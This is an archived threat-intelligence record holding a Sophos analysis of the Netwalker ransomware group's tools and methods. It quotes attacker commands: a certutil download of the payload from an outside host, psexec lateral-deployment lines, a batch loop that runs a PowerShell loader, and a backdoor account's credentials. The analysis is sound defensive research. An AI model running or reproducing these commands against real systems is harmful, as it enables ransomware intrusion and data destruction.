{
    "id": "4d1eb438-4f10-43b9-bdce-8c77f937be07",
    "created_at": "2023-01-12T15:08:34.923931Z",
    "updated_at": "2025-03-27T02:05:33.090634Z",
    "deleted_at": null,
    "sha1_hash": "40a99771c903039e65f2a70ca2de07c9db0eb4c5",
    "title": "2020-05-27 - Netwalker ransomware tools give insight into threat actor",
    "authors": "",
    "file_creation_date": "2022-05-28T21:41:43Z",
    "file_modification_date": "2022-05-28T21:41:43Z",
    "file_size": 379858,
    "plain_text": "# Netwalker ransomware tools give insight into threat actor\n\n**[news.sophos.com/en-us/2020/05/27/netwalker-ransomware-tools-give-insight-into-threat-actor/](https://news.sophos.com/en-us/2020/05/27/netwalker-ransomware-tools-give-insight-into-threat-actor/)**\n\nMay 27, 2020\n\nWhile investigating a malware campaign involving Netwalker ransomware, SophosLabs\nstumbled upon a set of files used by the criminals involved in the attacks. The trove of\nmalware and related files reveals details about methods the attackers employed to\ncompromise networks, elevate their privileges, and distribute the malware to workstations in\nvery recent attacks.\n\nIn this blog, we’ll survey the collection and the insight it provides into this threat actor’s\ntypical behavior. The tools included legitimate, publicly-available software (like TeamViewer),\nfiles cribbed from public code repositories (such as Github), and scripts (PowerShell) that\nappeared to have been created by the attackers themselves.\n\nThe Netwalker threat actor has struck a diverse set of targets based in the US, Australia, and\nwestern Europe, and recent reports indicate the attackers have decided to concentrate their\nefforts targeting large organizations, rather than individuals. The tooling we uncovered\nsupports this hypothesis, as it includes programs intended to capture Domain Administrator\ncredentials from an enterprise network, combined with orchestration tools that employ\nsoftware distribution served from a Domain Controller, common in enterprise networks but\nrare among home users.\n\nAnd while the bulk of the payloads were Netwalker, we also found individual samples of the\nZeppelin Windows ransomware and the Smaug Linux ransomware as well.\n\n\n-----\n\n## What’s in a criminal’s toolbox\n\nThe archive contained at least 12 archived copies of the ransomware deployment package\nused by the threat actors, but also included a bonanza: a comprehensive set of tools used to\nperform reconnaissance on targeted networks; privilege-elevation and other exploits against\nWindows computers; and utilities that can steal, sniff, or brute-force their way to valuable\ninformation (including Mimikatz, and variants called Mimidogz and Mimikittenz, designed\naround avoiding detection by endpoint security) from a machine or network.\n\nSome of the scripts and exploit tools were copied directly from Github repositories. Several\nof the tools are freely-available Windows utilities, such as Amplia Security’s Windows\nCredential Editor.\n\nWe also found a nearly complete set of the Microsoft SysInternals PsTools package, a copy\nof NLBrute (which attempts to brute-force passwords), installers for the commercial\nTeamViewer and AnyDesk remote support tools, and a number of utilities created by\nendpoint security vendors that are designed to remove their (and other companies’) endpoint\nsecurity and antivirus tools from a computer.\n\n## Dissecting the break-in\n\nIt isn’t entirely clear how the threat actors behind this campaign gain an initial foothold into\nthe networks they target, though there are hints they take advantage of well-known, heavily\npublicized vulnerabilities in widely used, outdated server software (such as Tomcat or\n\n\n-----\n\nWeblogic) or weak RDP passwords.\n\nWe found a brute-force tool called NLBrute, with configuration files that tell us it had been set\nup to use an included set of username and passwords to try to break in to machines that\nhave Remote Desktop enabled. NLBrute can be used in attacks targeting the perimeter, as\nwell as a way to gain lateral access to other machines from a “foothold” in the network.\n\nOnce inside the network of their target, the attackers apparently use the SoftPerfect Network\nScanner to identify and create target lists of computers with open SMB ports, and\nsubsequently may have used Mimikatz, Mimidogz, or Mimikittenz to obtain credentials.\n\nThe files we recovered also revealed their preferred collection of exploits. Among them, we\n[found variations on the EternalDarkness SMBv3 exploit (CVE-2020-0796), a](https://news.sophos.com/en-us/2020/03/12/patch-tuesday-for-march-2020-fixes-the-serious-smb-bug-cve-2020-0796/) CVE-2019-1458\nlocal privilege exploit against Windows, the [CVE-2017-0213 Windows COM privilege](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-0213)\nescalation exploit published on the Google Security Github account, and the CVE-2015-1701\n“RussianDoll” privilege escalation exploit.\n\nYou can either “su firefart” or…\n\nWe also found the source code for the firefart variant of the _[pokemon exploit against the](https://www.carbonblack.com/2016/12/07/dirty-truth-dirty-cow-cve-2016-5195/)_\n_dirtycow vulnerability; that’s far too many ludicrous names for one Linux privilege escalation_\nexploit. The attackers did not even bother modifying it from its default configured username\nvalue of firefart, either, but they may do that elsewhere.\n\n\n-----\n\nIn addition to exploits and hacking tools, the attackers have pulled together a ragtag\ncollection of software designed to remove endpoint security and antivirus tools from\nWindows computers. Among the tools we found in their collection were AV Remover,\npublished by ESET, and Trend Micro WorryFree Uninstall.\n\n### Ransomware delivery\n\nThe attackers typically distribute Netwalker ransomware with the use of a reflective\nPowerShell loader script that has been protected from casual analysis with several layers of\nobfuscation.\n\nThe script itself decodes and executes a large blob of base64-encoded text and converts it\ninto a huge byte array. The script then decrypts that byte array (with a one-byte XOR\nalgorithm) into a string, and then decodes another byte array out of this second array that\nnormally (but not always) contains both a 32-bit and 64-bit version of the DLL, which it then\nloads into memory.\n\nThe byte arrays contain a\n\n32-bit and 64-bit compiled payload\nHere the array $dYtajKpwMqeYDr contains the 32-bit payload and $pLJPFgJtEVxJpXr the\n64-bit payload. The starting MZ marker is replaced with 0xad 0xde in order to avoid\nsuspicion (highlighted in green). It is not needed anyway, because the DLLs are not loaded\nby the operating system; the script implements all the necessary steps, without checking the\nMZ magic.\n\nFinally the script deletes the shadow copies, in a preparation for the ransomware operations.\n\nThe attackers orchestrate attacks using batch or PowerShell scripts that are executed, with\nthe help of domain controllers, on any machine the DC can reach. The scripts retrieve the\nattackers’ payloads using psexec or certutil.\n\nThey apparently create a Domain Admin account named SQLSVC and give it the password\n**Br4pbr4p (which also happens to be the password salt preconfigured in the dirtycow exploit**\nscript) and then leverage that account to perform a series of commands.\n\ncertutil is a WIndows component that can download external content to the computer. In a\ntypical attack, the criminals follow this paradigm:\n\n\n-----\n\n```\ncertutil.exe urlcache split f http://{redacted}:8000/l0.exe l0.exe\n\n```\nThe attackers sometimes issue this downloader command en masse to the targeted\ncomputers, which dutifully download the executable form of the Netwalker ransomware as a\npayload.\n\nAlternatively, they distribute the ransomware executable within the targeted network\nthemselves, in real time. The files we recovered indicate they do it by executing a script file,\nwhich uses the Sysinternals psexec tool to move laterally by trying to copy it to every\nmachine they can reach:\n```\n\"commandLine\" : \"psexec.exe \\\\\\\\{redacted}.1 -d -c -f c:\\\\programdata\\\\rundl1.exe\",\n\"commandLine\" : \"psexec.exe \\\\\\\\{redacted}.2 -d -c -f c:\\\\programdata\\\\rundl1.exe\",\n…\n\"commandLine\" : \"psexec.exe \\\\\\\\localhost -d -c -f c:\\\\programdata\\\\rundl1.exe\",\n\n```\nThe relevant psexec command line switches are:\n```\n-c     Copy the specified program to the remote system for\nexecution. If you omit this option the application\nmust be in the system path on the remote system.\n-d     Don't wait for process to terminate (non-interactive).\n-f     Copy the specified program even if the file already\nexists on the remote system.\n\n```\nSo this method uses psexec itself to copy the payload over the network, overwrite earlier\nversions (if found), and run it without waiting for any response.\n\nThe attackers sometimes get a foothold within an organization, explore the network for a\nwhile, then distribute a PowerShell dropper for the ransomware.\n\nThey use batch files that leverage psexec, again, to push PowerShell loader scripts out to\nmachines the network scanner finds on the internal network.\n```\nfor /f %%G IN (%INPUT_FILE%) DO PsExec.exe -d \\\\%%G powershell -ExecutionPolicy\nBypass -NoProfile -NoLogo -NoExit -File \\\\{redacted}\\Users\\{redacted}\\{redacted}.ps1\n\n```\nIn both cases, the process ends with the Netwalker payload loaded and executed. The final\nmalware is either a DLL or executable file.\n\nThe files on the target computer get encrypted and the user finds a ransom message like this\none:\n\n\n-----\n\nThe Netwalker ransom demand. Click to view the entire note\nEach time they attacked a new victim organization, the attackers use a unique build of the\nNetwalker DLL. Oddly, many of the Netwalker DLLs have the same creation time in their PE\nheader. In fact, the only difference between them is the encrypted blob store in resource\nnumber 1337 or 31337. It seems likely that, most of the time, they use the same DLL\ntemplate and only change this encrypted blob.\n\nResource\n\n_1337 in Netwalker_\n\n### Conclusion\n\nRansomware attack nowadays are not single-shot events like Wannacry was in 2017. The\ncriminals have well-established procedures and toolsets they routinely use. The attacks are\nusually longer: attackers spend days (or even weeks) within the victim organizations,\ncarefully mapping the internal network while gathering credentials and other useful\ninformation.\n\nOur findings are a good example of the trend that we have observed all around the threat\nlandscape. The criminals orchestrate well-designed manual attack, infiltrate and thoroughly\nrecon the victim systems, disable protection before delivering the final attack.\n\nThe threat actors behind the Netwalker ransomware rely less on self-made tools than do\nother ransomware groups. The largest part of the toolset are tools collected from the public\ndomain. The use of these so-called grey hat applications saves them development time at\nthe cost of originality.\n\n\n-----\n\nViews like this one, directly into the attacker s tactics and tooling, offer a rare glimpse behind\nthe curtain that dramatically helps defenders prepare their defense against the early stages\nof an attack, before attackers can deliver their ransomware payloads.\n\n## IOCs\n\nSophosLabs has published a list of indicators of compromise for samples acquired for this\n[analysis on its Github page.](https://github.com/sophoslabs/IoCs/blob/master/Ransomware-Netwalker)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-05-27 - Netwalker ransomware tools give insight into threat actor.pdf"
    ],
    "report_names": [
        "2020-05-27 - Netwalker ransomware tools give insight into threat actor.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536114,
    "ts_updated_at": 1743041133,
    "ts_creation_date": 1653774103,
    "ts_modification_date": 1653774103,
    "files": {
        "pdf": "https://archive.orkl.eu/40a99771c903039e65f2a70ca2de07c9db0eb4c5.pdf",
        "text": "https://archive.orkl.eu/40a99771c903039e65f2a70ca2de07c9db0eb4c5.txt",
        "img": "https://archive.orkl.eu/40a99771c903039e65f2a70ca2de07c9db0eb4c5.jpg"
    }
}